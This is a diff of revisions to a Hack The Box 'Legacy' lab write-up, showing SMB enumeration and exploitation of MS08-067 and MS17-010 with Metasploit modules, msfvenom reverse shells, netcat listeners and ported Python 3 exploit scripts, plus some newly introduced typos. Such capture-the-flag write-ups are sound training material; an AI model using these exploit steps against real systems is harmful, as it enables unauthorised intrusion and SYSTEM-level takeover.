@@ -2,7 +2,7 @@
 title: "Hack The Box: Legacy"
 date: 2026-07-12
 ref: WU-002
-summary: "Rooting the retired HTB 'Legacy' machine — enumerating SMB on Windows XP SP3, validating two CVEs with NSE scripts, and exploiting both MS08-067 and MS17-010 with Metasploit, ported Python 3 scripts, and a custom tool."
+summary: "Rooting the retired HTB 'Legacy' machine — enumerating SMB on Windows XP SP3, discovering two CVEs with NSE scripts, validating both MS08-067 and MS17-010 with Metasploit and learning from the process, manually exploiting both using ported Python 3 scripts."
 tags: [hack-the-box, smb, ms08-067, ms17-010, windows, metasploit]
 ---
 
@@ -16,7 +16,7 @@ administrative access. It reinforces the importance of thorough enumeration,
 vulnerability validation, and understanding the risks associated with unpatched
 legacy systems.
 
-**Retired machine — `legacy.hackthebox.gr`**
+**Retired machine — `legacy.htb`**
 
 - **IP Address:** 10.129.227.181
 - **Operating System:** Windows XP SP3
@@ -91,7 +91,7 @@ PING 10.129.227.181 (10.129.227.181) 56(84) bytes of data.
 rtt min/avg/max/mdev = 23.287/23.433/23.724/0.205 ms
 ```
 
-With connectivity confirmed, we run a service and version scan across the default
+With connectivity confirmed, we run a Nmap service and version scan across the default
 port range and find three open ports.
 
 ```bash
@@ -104,8 +104,8 @@ PORT    STATE SERVICE      VERSION
 445/tcp open  microsoft-ds Windows XP microsoft-ds
 ```
 
-This is enough to work with. If nothing useful comes from these results we can
-widen or narrow the scanning scope accordingly.
+For now this is plenty enough to work with. If nothing intesring is found from these results we can
+widen or adjust the scanning paramaters accordingly.
 
 ## SMB
 
@@ -178,7 +178,7 @@ exploitation.
 ### Metasploit
 
 Loading Metasploit with the `-q` flag skips the banner. Searching `ms08-067`
-returns a single module with several target sub-options — one for each Windows
+returns a single module with several target (many removed for brevity) sub-options — one for each Windows
 version it supports.
 
 ```bash
@@ -197,6 +197,7 @@ Matching Modules
    3    \_ target: Windows XP SP0/SP1 Universal .                .      .      .
    4    \_ target: Windows 2003 SP0 Universal   .                .      .      .
    5    \_ target: Windows XP SP2 English (AlwaysOn NX)         .      .      .
+<------------------------------------------------------ Results Ommited For Brevity ------------------------------------------------------------>
 ```
 
 Before selecting a target it is worth understanding what the three variables in
@@ -209,7 +210,7 @@ you will either crash the service or get no shell.
 Windows XP [Service Pack] [Language] (NX/DEP Status)
 ```
 
-For now we select `Automatic Targeting` and let Metasploit handle it. We check
+For now we select `Automatic Targeting` and let Metasploit do the heavy lifting. We check
 the required options with `show options`, set `RHOSTS` to the target, and point
 `LHOST` at our `tun0` adapter.
 
@@ -246,7 +247,7 @@ indicates the machine account rather than a user account, confirming we are
 running as SYSTEM.
 
 The most important output is in the lines before the session opens: Metasploit's
-own fingerprinting identified "Windows XP — Service Pack 3 — lang:English" and
+own fingerprinting identified "Windows XP — Service Pack 3 — English" and
 automatically selected the `AlwaysOn NX` target. The module tries `AlwaysOn NX`
 first as the most conservative assumption — if DEP is disabled or in an optional
 state it will fall through to a simpler path, so starting with the hardest case
@@ -294,6 +295,9 @@ Inspecting the Metasploit module that did work reveals what it does differently.
 ┌──(kali㉿kali)-[~/…/Machines/Legacy/Exploit/MS08-067]
 └─$ find / -name "ms08_067_netapi.rb" 2>/dev/null
 /usr/share/metasploit-framework/modules/exploits/windows/smb/ms08_067_netapi.rb
+
+┌──(kali㉿kali)-[~/…/Machines/Legacy/Exploit/MS08-067]
+└─$ cat /usr/share/metasploit-framework/modules/exploits/windows/smb/ms08_067_netapi.rb
 ```
 
 The relevant section shows no simple return address. Instead it uses a full ROP
@@ -374,8 +378,7 @@ rvasets = { 'call_HeapCreate': 0x21286, ... 'add eax, 8 / ret': 0x29c64 }
 This is also Python 2, so we port it to Python 3 with updated impacket API
 calls. We also simplify the shellcode section: rather than keeping the original
 hardcoded payload, we clear the buffer and add generation instructions at the top.
-The ported script is available at
-[github.com/Hackopotamus/Hack-The-Box-Exploit-Ports-and-Fixes](https://github.com/Hackopotamus/Hack-The-Box-Exploit-Ports-and-Fixes).
+The ported script is available [here](https://github.com/Hackopotamus/Hack-The-Box-Exploit-Ports-and-Fixes/tree/main/Legacy/MS08-067).
 
 ```python
 #!/usr/bin/env python3
@@ -425,7 +428,7 @@ script's header to avoid breaking the exploit, and paste the output into `buf`.
 
 ![The msfvenom shellcode pasted into the buf variable in the Python 3 exploit]({{ '/assets/img/htb-legacy/ms08-067-buffer.png' | relative_url }})
 
-With a netcat listener ready, we run the exploit and catch a shell.
+With a netcat listener ready and the modified code saved, we run the exploit using option `7` and catch a shell.
 
 ```bash
 ┌──(kali㉿kali)-[~/…/Machines/Legacy/Exploit/MS08-067]
@@ -451,14 +454,15 @@ C:\WINDOWS\system32>
 > `netapi32.dll`, making the service unresponsive. A machine reset was required
 > before this run.
 
-MS08-067 is done. We move on to the second exploit path.
+That completes MS08-067 using multiple methods. Next, we can move on to the second 
+exploit path available to us.
 
 ## MS17-010
 
 MS17-010 is a critical security bulletin released by Microsoft in March 2017,
 addressing multiple vulnerabilities in SMBv1. The most severe allows
-unauthenticated remote code execution by sending a malicious packet to a target,
-resulting in full SYSTEM-level access.
+unauthenticated remote code execution by sending a Specially crafted SMB packets 
+packet to a target, resulting in full SYSTEM-level access.
 
 > **Interesting fact**
 >
@@ -478,7 +482,26 @@ so we can streamline our approach.
 
 Searching for `MS17-010` in Metasploit returns a broad list of modules, most of
 which are not compatible with Windows XP. After testing several options, we settle
-on `ms17_010_psexec` using the **MOF upload** target.
+on `ms17_010_psexec` using the **MOF upload** targeting type.
+
+> **What is a MOF file?**
+>
+> A Windows MOF (Managed Object Format) file is a text-based script used by
+> Windows Management Instrumentation (WMI) to define classes and configure
+> system settings. Because WMI processes MOF files automatically at import, this
+> method bypasses service-based binary execution entirely.
+>
+> **Why we use a MOF upload?**
+>
+> When we initially tried `Automatic` and `Native upload`, we received
+> `ERROR_CODE: 193` (`ERROR_BAD_EXE_FORMAT`) even when specifying the
+> correct x86 architecture. This means the service created by the psexec method
+> cannot execute the binary on this XP build. MOF upload sidesteps the problem
+> entirely — instead of running an executable as a service, it drops a WMI MOF
+> file that Windows processes automatically.
+
+
+Once selected, we can then set up the targeting requirements for the module as we would do normally.
 
 ```bash
 msf > use 14
@@ -488,19 +511,8 @@ RHOSTS => 10.129.227.181
 msf exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
 ```
 
-**Why MOF upload?** When we initially tried `Automatic` and `Native upload`, we
-received `ERROR_CODE: 193` (`ERROR_BAD_EXE_FORMAT`) even when specifying the
-correct x86 architecture. This means the service created by the psexec method
-cannot execute the binary on this XP build. MOF upload sidesteps the problem
-entirely — instead of running an executable as a service, it drops a WMI MOF
-file that Windows processes automatically.
 
-> **What is a MOF file?**
->
-> A Windows MOF (Managed Object Format) file is a text-based script used by
-> Windows Management Instrumentation (WMI) to define classes and configure
-> system settings. Because WMI processes MOF files automatically at import, this
-> method bypasses service-based binary execution entirely.
+Running this module successfully give us a shell on the system and we can use `ipconfig` to show proof.
 
 ```bash
 msf exploit(windows/smb/ms17_010_psexec) > run
@@ -528,7 +540,7 @@ into a dead end and moving on to manual exploitation.
 
 ![Metasploit ms17_010_command module options]({{ '/assets/img/htb-legacy/ms17-010-show-options.png' | relative_url }})
 
-We set `RHOSTS` and test with a ping back to our machine to confirm RCE.
+We set `RHOSTS` and use the `COMMAND` option to test RCE with a ping back to our machine.
 
 ```bash
 msf auxiliary(admin/smb/ms17_010_command) > set COMMAND 'ping -n 3 10.10.14.75'
@@ -543,7 +555,8 @@ Reply from 10.10.14.75: bytes=32 time=24ms TTL=63
 Reply from 10.10.14.75: bytes=32 time=22ms TTL=63
 ```
 
-We also confirm the requests on our end with `tcpdump`.
+We also get hits on our attacker machine, we use `tcpdump` to see the incoming ICMP requests that validate 
+command execution is possible.
 
 ```bash
 ┌──(kali㉿kali)-[~/…/Machines/Legacy/Exploit/MS17-010]
@@ -554,21 +567,28 @@ We also confirm the requests on our end with `tcpdump`.
 05:36:20.654056 IP 10.129.227.181 > 10.10.14.75: ICMP echo request, id 512, seq 768, length 40
 ```
 
-RCE is confirmed, but attempts to convert this into a full interactive shell all
+RCE is confirmed, but attempts to convert this into a full interactive session all
 failed. Methods attempted:
 
 - Creating a new user and adding it to the Administrators group via the `net` command.
-- Resetting the Administrator account password, then connecting via Impacket's WMIexec and PSExec modules.
+- Resetting the Administrator account password also using the `net` command.
+- Attempted to chain both above methods by connecting via Impacket's WMIexec and PSExec modules with both been disallowed.
 - Generating a 32-bit shell with `msfvenom`, hosting it on a Python HTTP server, and fetching it with `certutil`.
+- No hits on the HTTP server were ever seen meaning the methord failed.
 
-We move on to a manual approach.
+> **Hindsight is a wonderful thing**
+> 
+>  At the time of editing and refining the post, it hit me very blatantly that I should have used SMB server and either
+>  hosted the reverse shell and called it remotely, or sent the file and used to module to execute it after placement.
+>  Oh well, hindsight is a wonderful thing after all.
+
+In the interest of time, let's move on to a manual approach instead.
 
 ### Manual exploitation
 
-We clone a fork of Worawit's MS17-010 repository by helviojunior
-([github.com/helviojunior/MS17-010](https://github.com/helviojunior/MS17-010)),
-which includes a `send_and_execute.py` script that exploits the vulnerability and
-runs an arbitrary binary on the target.
+We clone a fork of ([Worawit's](https://github.com/worawit/MS17-010)) repository by 
+([helviojunior](https://github.com/helviojunior/MS17-010)), which includes a `send_and_execute.py` script that exploits 
+the vulnerability and runs an arbitrary binary on the target.
 
 ```bash
 ┌──(kali㉿kali)-[~/…/Machines/Legacy/Exploit/MS17-010]
@@ -580,7 +600,7 @@ runs an arbitrary binary on the target.
 checker.py  send_and_execute.py  mysmb.py  zzz_exploit.py  ...
 ```
 
-We generate a 32-bit reverse shell executable and set up a listener.
+We generate a 32-bit reverse shell executable using `msfvenom` and then set up a listener using `nc` for later on.
 
 ```bash
 ┌──(kali㉿kali)-[~/…/Legacy/Exploit/MS17-010/helviojunior]
@@ -596,8 +616,7 @@ listening on [any] 443 ...
 ```
 
 The original script requires Python 2 impacket modules that are not available,
-so we port it to Python 3. The full ported version is hosted at
-[github.com/Hackopotamus/Hack-The-Box-Exploit-Ports-and-Fixes](https://github.com/Hackopotamus/Hack-The-Box-Exploit-Ports-and-Fixes).
+so we port it to Python 3. The full ported version is hosted [here](https://github.com/Hackopotamus/Hack-The-Box-Exploit-Ports-and-Fixes/tree/main/Legacy/MS17-010).
 The key changes from the original are:
 
 ```python
@@ -609,7 +628,7 @@ The key changes from the original are:
 # - conn.send_echo(b'a') instead of conn.send_echo('a')
 ```
 
-Running the exploit produces results and we land a shell.
+Running the exploit is successful and we get call back to our netcat listener, landing us a shell on Legacy.
 
 ```bash
 ┌──(kali㉿kali)-[~/…/Legacy/Exploit/MS17-010/helviojunior]
@@ -646,8 +665,8 @@ Ethernet adapter Local Area Connection:
 
 ## Obtaining the flags
 
-With a shell and SYSTEM-level access from either exploit path, we locate both
-flags with a single search command and read them with `type`.
+With a shell and SYSTEM-level access from exploit path (manual or automatic), we locate both
+flags with the below search commands and read them with `type` to show both flags.
 
 ```bash
 C:\WINDOWS\system32>dir C:\ /s /b /a:-d 2>nul | find "root.txt"
